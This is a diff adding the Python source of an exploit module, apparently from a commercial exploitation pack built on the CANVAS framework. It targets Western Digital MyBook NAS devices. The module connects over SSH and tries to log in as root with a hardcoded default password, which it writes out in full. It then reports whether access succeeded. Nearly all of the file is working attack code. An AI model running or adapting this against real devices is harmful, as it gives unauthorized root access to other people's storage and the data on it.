@@ -1,0 +1,126 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+import sys, time, os, re
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+import libs.paramiko as paramiko
+
+NAME = "d2sec_wdmybook_1"
+VERSION = "0.1"
+DESCRIPTION = "Western Digital MyBook NAS Default Account Vulnerability"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = "01.02.14"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Date public"] = ""
+DOCUMENTATION["References"] = ""
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["CVE Url"] = ""
+DOCUMENTATION["Notes"] = "Authentication on ssh server Western Digital MyBook NAS with a default root password" 
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.setInfo(DESCRIPTION)
+    self.name = NAME
+    self.host = ''
+    self.port = 22
+    self.user = 'root'
+    self.password = 'welc0me'
+	
+  def getargs(self):	
+    self.host = self.target.interface
+
+  def connect_to_host(self):
+    sock = self.gettcpsock()
+    try:
+      sock.connect((self.host, self.port))
+    except Exception, e:
+      self.log("[D2] Connection failed: %s" % e)
+      return None
+    return sock
+
+  def open_ssh_transport(self, sock):
+    t = paramiko.Transport(sock)
+    try:
+      t.connect()
+    except paramiko.SSHException, e:
+      if "Error reading SSH protocol" in str(e):
+        self.log("[D2] Connection has been overwhelmed (or is not SSH!)")
+        t.close()
+        self.log("[D2] Thread sleeping to let server recover")
+        time.sleep(120)
+        return None
+    return t
+
+  def close_ssh_transport(self, t):
+    t.close()
+
+  def test_ssh_server(self):
+    self.log('[D2] Test SSH server on %s' % self.host)
+    sock = self.connect_to_host()
+    if sock == None:
+      return 1
+    t = paramiko.Transport(sock)
+    try:
+      t.connect()
+    except paramiko.SSHException, e:
+      if "Error reading SSH protocol" in str(e):
+        self.log("[D2] Connection has been overwhelmed (or is not SSH!)")
+        t.close()
+        return 1
+    self.log('[D2] SSH server enabled !') 
+    t.close()
+    return 0
+
+  def run(self):
+    self.getargs()
+    self.setInfo('[D2] %s attacking %s:%d' % (NAME,self.host,self.port)) 
+    if self.test_ssh_server():
+      self.log('[D2] SSH server is not enabled on %s'%self.host)
+      return 0
+    sock = self.connect_to_host()
+    if sock == None:
+      return 0
+    t = self.open_ssh_transport(sock)
+    if t == None:
+      return 0
+    try:
+      self.log("[D2] Trying %s:%s" % (self.user, self.password))
+      t.auth_password(username=self.user, password=self.password)
+    except paramiko.SSHException, e:
+      self.log("[D2] SSH Exception: %s" % e)  
+      return 0
+    else:
+      self.log("[D2] Password %s is valid !" % self.password)
+    self.close_ssh_transport(t)
+    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+    return 1
+
+  def usage(self):
+    print "Usage: "+sys.argv[0]+" -t target" 
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
